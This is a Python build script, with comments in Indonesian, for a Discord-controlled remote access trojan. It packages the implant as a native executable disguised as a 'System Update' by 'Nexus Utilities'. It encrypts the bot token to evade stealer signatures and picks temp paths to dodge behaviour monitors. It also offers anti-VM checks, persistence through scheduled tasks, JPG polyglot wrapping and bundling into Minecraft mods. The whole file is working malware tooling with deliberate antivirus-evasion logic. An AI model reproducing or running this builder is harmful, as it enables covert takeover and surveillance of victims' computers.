"""builder.py â€” staging, enkripsi config, packaging.

Contoh:
    python builder.py --token "MTIz..." --channel 1234567890 --name SysUpdate
    python builder.py --token ... --channel ... --engine nuitka
    python builder.py --token ... --channel ... --engine nuitka-dir
    python builder.py --token ... --channel ... --engine pyinstaller
    python builder.py --token ... --channel ... --polyglot D:\\foto\\cover.jpg

Engine:
    nuitka       satu .exe, dikompilasi MSVC jadi native. Nggak ada bootloader
                 PyInstaller, nggak ada arsip PYZ, nggak ada bytecode Python
                 yang bisa di-decompile. Ini default.
    nuitka-dir   folder standalone. Nol ekstraksi saat runtime â€” dipakai
                 kalau payload mau ditanam ke mod Minecraft atau dibawa
                 bareng launcher lain.
    pyinstaller  fallback lama. Masih jalan, tapi bootloader-nya itu bagian
                 yang paling sering jadi signature.
    folder       sumber .py + run.vbs, butuh Python di target. Buat debug.
"""

import argparse
import base64
import datetime
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import uuid as uuidlib

from core._crypt import SEP, _stream

ROOT = os.path.dirname(os.path.abspath(__file__))
CORE_SRC = os.path.join(ROOT, "core")
TOOLS = os.path.join(ROOT, "tools")

CONFIG_TMPL = '''"""Generated {ts} â€” jangan diedit tangan.

Token, channel, dan base URL disimpan sebagai blob terenkripsi. Yang
muncul di binary cuma base64 acak, bukan pola token Discord.
"""

from ._crypt import open_blob

_K = {key!r}

_B = "{blob}"

_f = open_blob(_B, _K)
TOKEN = _f[0]
CHANNEL = int(_f[1])
UUID = _f[2]
NAME = _f[3]
POLL = float(_f[4])
ANTI_VM = _f[5] == "1"
PERSIST = _f[6] == "1"
TASK = _f[7] == "1"
API = _f[8]
# Alias pendek: !a info, !b shot. Dipakai kalau mesinnya sudah banyak dan
# uuid8 nggak muat di kepala.
ALIAS = _f[9]
'''

ENTRY = '''import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.main import run

if __name__ == "__main__":
    run()
'''

VBS = '''Set sh = CreateObject("WScript.Shell")
sh.Run "pythonw.exe ""{entry}""", 0, False
'''

TOKEN_RE = re.compile(r"^[A-Za-z0-9_\-.]{50,}$")

DEFAULT_API = "https://discord.com/api/v10"


def pack_config(token, channel, uid, name, poll, anti_vm, persist, task, api,
                alias):
    """Balikin (key, base64blob). XOR dengan SHA-256 counter stream."""
    fields = [token, str(channel), uid, name, repr(float(poll)),
              "1" if anti_vm else "0", "1" if persist else "0",
              "1" if task else "0", api, alias]
    plain = SEP.join(fields).encode("utf-8")
    key = os.urandom(32)
    ks = _stream(key, len(plain))
    blob = base64.b64encode(bytes(a ^ b for a, b in zip(plain, ks))).decode("ascii")
    return key, blob


def stage(cfg, uid, base=None):
    """Siapkan folder staging.

    base NAIK ke drive output, bukan %TEMP%. Build Nuitka butuh ~400 MB
    ruang kerja dan %TEMP% ada di C: â€” di mesin ini C: sisa di bawah 1 GB,
    jadi build mati bukan karena kode tapi karena drive sistem penuh.
    """
    if base is None:
        base = tempfile.gettempdir()
    os.makedirs(base, exist_ok=True)
    tmp = tempfile.mkdtemp(prefix="ratbuild_", dir=base)
    pkg = os.path.join(tmp, "core")
    os.makedirs(pkg)
    for f in os.listdir(CORE_SRC):
        if f.endswith(".py") or f.endswith(".pyd"):
            shutil.copy2(os.path.join(CORE_SRC, f), os.path.join(pkg, f))
    with open(os.path.join(pkg, "config.py"), "w", encoding="utf-8") as fh:
        fh.write(cfg)
    entry = os.path.join(tmp, "entry.py")
    with open(entry, "w", encoding="utf-8") as fh:
        fh.write(ENTRY)
    # Staging nggak boleh bawa jejak yang bisa dibaca kalau exe dibongkar.
    keep = {".py", ".pyd"}
    for name in os.listdir(os.path.join(tmp, "core")):
        if os.path.splitext(name)[1] not in keep:
            os.remove(os.path.join(tmp, "core", name))
    return tmp, entry


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def build_pyinstaller(staging, entry, name, out, icon):
    work = os.path.join(staging, "_work")
    cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm", "--clean",
           "--onefile", "--noconsole",
           "--name", name,
           "--distpath", out, "--workpath", work, "--specpath", work,
           "--paths", staging, entry]
    if icon:
        cmd[cmd.index("--name"):cmd.index("--name")] = ["--icon", os.path.abspath(icon)]
    print("[*] " + " ".join(cmd))
    subprocess.run(cmd, check=True, cwd=staging)
    return os.path.join(out, name + ".exe")


def _nuitka_cmd(staging, entry, name, out, icon, meta, standalone, compiler,
                remove_output=True, compress=True, low_memory=False):
    cmd = [sys.executable, "-m", "nuitka",
           "--assume-yes-for-downloads",
           "--nofollow-import-to=tkinter,unittest,pydoc,doctest,test,lib2to3,"
           "distutils,setuptools,pip,wheel",
           "--python-flag=no_asserts,no_docstrings",
           "--include-package=core",
           "--output-dir=" + out,
           "--output-filename=" + name + ".exe",
           "--windows-console-mode=disable",
           "--windows-company-name=" + meta["company"],
           "--windows-product-name=" + meta["product"],
           "--windows-file-description=" + meta["desc"],
           "--windows-file-version=" + meta["version"],
           "--windows-product-version=" + meta["version"]]
    if compiler == "zig":
        # Zig dipakai kalau VS nggak terdeteksi (mis. BuildTools 18 yang
        # nggak daftar di HKLM\...\VisualStudio\SxS\VS7). Hasilnya tetap
        # native, cuma toolchain-nya beda.
        cmd.append("--zig")
    else:
        cmd.append("--msvc=latest")
    if remove_output:
        cmd.append("--remove-output")
    if low_memory:
        # Nuitka menurunkan level zstd dari 22 ke 3 dan mematikan thread
        # kompresi. Level 22 butuh >1 GB RAM; di mesin yang RAM-nya kepakai
        # Chrome, onefile mati di tahap akhir dengan "Allocation error".
        cmd.append("--low-memory")
    if not compress:
        # zstd level tinggi butuh >1 GB RAM. Di mesin yang RAM-nya penuh,
        # onefile mati di tahap akhir dengan "Allocation error". Payload
        # yatim 38 MB, jadi exe tanpa kompresi ~40 MB â€” masih wajar.
        cmd.append("--onefile-no-compression")
    if standalone:
        cmd.append("--standalone")
    else:
        # Temp dir tetap: ekstraksi cuma sekali seumur instalasi, bukan tiap
        # kali proses jalan. Nama acak onefile_XXXX tiap launch itu pola yang
        # persis dicari behavior monitor.
        cmd.append("--onefile")
        # "msoia" adalah nama biner Office Input Agent yang sudah bertahun-tahun
        # dipakai malware sebagai kedok; folder itu sendiri jadi sinyal.
        # Sekarang skema yang sama dengan installer per-user biasa.
        cmd.append("--onefile-tempdir-spec={CACHE_DIR}/{COMPANY}/"
                   "{PRODUCT}/{VERSION}")
    if icon:
        cmd.append("--windows-icon-from-ico=" + os.path.abspath(icon))
    cmd.append(entry)
    return cmd


def build_nuitka(staging, entry, name, out, icon, meta, standalone, compiler="auto",
                 remove_output=True, compress=True, low_memory=False):
    tries = ["msvc", "zig"] if compiler == "auto" else [compiler]
    last = None
    for c in tries:
        cmd = _nuitka_cmd(staging, entry, name, out, icon, meta, standalone, c,
                          remove_output, compress, low_memory)
        print("[*] compiler : %s" % c)
        print("[*] " + " ".join(cmd))
        try:
            subprocess.run(cmd, check=True, cwd=staging)
            if standalone:
                return os.path.join(out, name + ".dist")
            return os.path.join(out, name + ".exe")
        except subprocess.CalledProcessError as exc:
            last = exc
            print("[!] toolchain %s gagal" % c)
    raise last


def build_folder(staging, entry, name, out):
    dest = os.path.join(out, name)
    if os.path.isdir(dest):
        shutil.rmtree(dest)
    shutil.copytree(staging, dest, ignore=shutil.ignore_patterns("_work", "*.pyc"))
    with open(os.path.join(dest, "run.vbs"), "w", encoding="utf-8") as fh:
        fh.write(VBS.format(entry=os.path.join(dest, "entry.py")))
    return dest


def polyglot(image, artifact, out):
    sys.path.insert(0, TOOLS)
    import polyglot as pg
    return pg.wrap(image, artifact, out)


def leak_check(artifact, token, api):
    """Pastikan token dan host nggak muncul plaintext di hasil build.

    Ini bukan teori. Token Discord cocok sama regex yang dipakai banyak
    engine buat nandain stealer, jadi satu string itu cukup buat naikin
    skor heuristik seluruh file.
    """
    probes = [token, api, api.split("/")[2]]
    hits = []
    if os.path.isfile(artifact):
        with open(artifact, "rb") as fh:
            data = fh.read()
        for p in probes:
            if p and p.encode() in data:
                hits.append(p)
    elif os.path.isdir(artifact):
        for root_, _, files in os.walk(artifact):
            for f in files:
                path = os.path.join(root_, f)
                try:
                    with open(path, "rb") as fh:
                        data = fh.read()
                except OSError:
                    continue
                for p in probes:
                    if p and p.encode() in data:
                        hits.append("%s in %s" % (p, os.path.relpath(path, artifact)))
    return hits


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--token", required=True)
    ap.add_argument("--channel", required=True)
    ap.add_argument("--name", default="SysUpdate")
    ap.add_argument("--engine", default="nuitka",
                    choices=["nuitka", "nuitka-dir", "pyinstaller", "folder"])
    ap.add_argument("--compiler", default="auto",
                    choices=["auto", "msvc", "zig"],
                    help="toolchain C untuk engine nuitka")
    ap.add_argument("--out", default=os.path.join(ROOT, "dist"))
    ap.add_argument("--work", default="",
                    help="folder kerja build (default: .work di sebelah --out)")
    ap.add_argument("--icon", default="")
    ap.add_argument("--uuid", default="")
    ap.add_argument("--alias", default="",
                    help="nama pendek mesin: !a info. default: huruf pertama uuid")
    ap.add_argument("--poll", type=float, default=3.0)
    ap.add_argument("--api", default=DEFAULT_API)
    ap.add_argument("--anti-vm", action="store_true")
    ap.add_argument("--no-persist", action="store_true")
    ap.add_argument("--task", action="store_true", help="pakai schtasks juga")
    ap.add_argument("--company", default="Nexus Utilities")
    ap.add_argument("--product", default="System Update")
    ap.add_argument("--desc", default="Keeps system components up to date")
    ap.add_argument("--version", default="1.0.0.0")
    ap.add_argument("--polyglot", default="")
    ap.add_argument("--keep", action="store_true", help="jangan hapus staging")
    ap.add_argument("--keep-output", action="store_true",
                    help="pakai ulang objek C dari build sebelumnya (retry cepat)")
    ap.add_argument("--no-compress", action="store_true",
                    help="matikan kompresi onefile (kalau RAM penuh)")
    ap.add_argument("--low-memory", action="store_true",
                    help="zstd level 3 + 1 thread; pakai kalau onefile gagal karena RAM")
    args = ap.parse_args()

    if not TOKEN_RE.match(args.token):
        print("[!] format token aneh. Bot token panjangnya ~70+ char, ada titik di tengah.")
        return 2
    if not str(args.channel).isdigit():
        print("[!] channel harus angka (ID numerik, bukan nama channel).")
        return 2
    if not args.api.startswith("http"):
        print("[!] --api harus URL penuh, misal https://discord.com/api/v10")
        return 2

    os.makedirs(args.out, exist_ok=True)
    # Semua folder sementara build dipaku ke drive output. Nuitka membaca
    # TMP/TEMP/TMPDIR untuk data composer dan file antara; kalau itu di C:
    # dan C: sesak, build gagal di tahap akhir dengan pesan yang menyesatkan
    # ("Allocation error", "Permission denied").
    work = args.work or os.path.join(os.path.dirname(os.path.abspath(args.out)), ".work")
    os.makedirs(work, exist_ok=True)
    for var in ("TMP", "TEMP", "TMPDIR"):
        os.environ[var] = work
    free_gb = shutil.disk_usage(work).free / 2 ** 30
    print("[*] work     : %s (%.1f GB bebas)" % (work, free_gb))
    if free_gb < 1.0:
        print("[!] drive kerja hampir penuh, build bisa gagal di tahap onefile")
    uid = args.uuid or str(uuidlib.uuid4())
    alias = (args.alias or uid[:1]).strip()
    if len(alias) > 3 or not alias.isalnum():
        print("[!] alias harus 1-3 karakter alfanumerik, misal a, b, pc1")
        return 2
    key, blob = pack_config(args.token, int(args.channel), uid, args.name,
                            args.poll, args.anti_vm, not args.no_persist,
                            args.task, args.api, alias)
    cfg = CONFIG_TMPL.format(
        ts=datetime.datetime.now().isoformat(timespec="seconds"),
        key=key, blob=blob)
    meta = {"company": args.company, "product": args.product,
            "desc": args.desc, "version": args.version}

    staging, entry = stage(cfg, uid, work)
    print("[*] staging  : %s" % staging)
    print("[*] uuid     : %s" % uid)
    print("[*] engine   : %s" % args.engine)

    try:
        if args.engine == "pyinstaller":
            artifact = build_pyinstaller(staging, entry, args.name, args.out, args.icon)
        elif args.engine in ("nuitka", "nuitka-dir"):
            artifact = build_nuitka(staging, entry, args.name, args.out, args.icon,
                                    meta, args.engine == "nuitka-dir", args.compiler,
                                    remove_output=not args.keep_output,
                                    compress=not args.no_compress,
                                    low_memory=args.low_memory)
        else:
            artifact = build_folder(staging, entry, args.name, args.out)
    except subprocess.CalledProcessError as exc:
        print("[!] build gagal: %s" % exc)
        return 1

    if args.polyglot and os.path.isfile(artifact):
        wrapped = os.path.join(args.out, os.path.splitext(
            os.path.basename(args.polyglot))[0] + ".jpg")
        polyglot(args.polyglot, artifact, wrapped)
        print("[*] polyglot : %s" % wrapped)

    manifest = {
        "uuid": uid, "alias": alias, "name": args.name, "channel": int(args.channel),
        "engine": args.engine, "artifact": artifact,
        "built": datetime.datetime.now().isoformat(timespec="seconds"),
        "meta": meta,
    }
    if os.path.isfile(artifact):
        manifest["size"] = os.path.getsize(artifact)
        manifest["sha256"] = sha256(artifact)

    leaks = leak_check(artifact, args.token, args.api)
    manifest["plaintext_leaks"] = leaks
    with open(os.path.join(args.out, args.name + ".json"), "w", encoding="utf-8") as fh:
        json.dump(manifest, fh, indent=2)

    print("[*] artifact : %s" % artifact)
    if os.path.isfile(artifact):
        print("[*] ukuran   : %.1f MB" % (os.path.getsize(artifact) / 1048576.0))
        print("[*] sha256   : %s" % manifest["sha256"])
    if leaks:
        print("[!] BOCOR    : %d string plaintext ketemu" % len(leaks))
        for h in leaks[:5]:
            print("      " + h.replace(args.token, "<token>"))
    else:
        print("[*] leak     : bersih (token & host nggak ada plaintext)")
    print("[*] manifest : %s" % os.path.join(args.out, args.name + ".json"))
    print("[*] alias    : !%s  (mis. !%s info, !%s shot)" % (alias, alias, alias))
    if args.engine == "folder":
        print("[*] folder mode butuh Python di target. Jalankan run.vbs, bukan entry.py.")
    if args.engine == "nuitka-dir":
        print("[*] mode dir: bawa seluruh folder. Exe ada di dalamnya.")
    if args.engine == "nuitka":
        # Spek tempdir statis -> bootstrap membandingkan CRC32 tiap file
        # dengan yang sudah ada di folder cache, jadi launch kedua dan
        # seterusnya nggak menulis ulang 38 MB. Kalau isinya berubah
        # (build baru), file yang beda ditimpa otomatis.
        print("[*] cache    : %LOCALAPPDATA%\\" + args.company + "\\" + args.product + "\\" + args.version)
    if not args.keep:
        shutil.rmtree(staging, ignore_errors=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
